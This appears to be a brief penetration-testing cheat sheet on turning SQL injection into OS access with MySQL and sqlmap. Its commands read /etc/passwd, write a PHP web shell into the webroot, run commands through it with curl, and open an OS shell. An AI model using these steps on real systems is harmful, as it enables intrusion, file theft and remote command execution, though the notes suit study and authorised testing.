# OS Exploitation
***

### File Read/Write
#### In MySQL, to read local files, the DB user must have the privilege to **LOAD DATA** and **INSERT**, to be able to exfiltrate data from a file to a table and then  reading that table.
##### Command example:
```SQL
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

### Checking for DBA Privileges
```bash
$  sqlmap -u "http://www.example.com/notthisagain.php?id=1337" --is-dba
```

### Reading Local Files
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --file-read "/etc/passwd"
```

### Writing Local Files
#### In MySQL the `-secure-file-priv` configuration must be manually disabled to allow writing data into local files using the **INTO OUTFILE**

#### Write a Web Shell to a file
```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### Write that file to the default server webroot
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
#### Then we can execute any command by doing the following:
```bash
$ curl http://www.example.com/shell.php?cmd=ls+-la
```

### OS Command Execution
#### Getting OS shell through SQLMap
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --os-shell --technique=E --batch
```

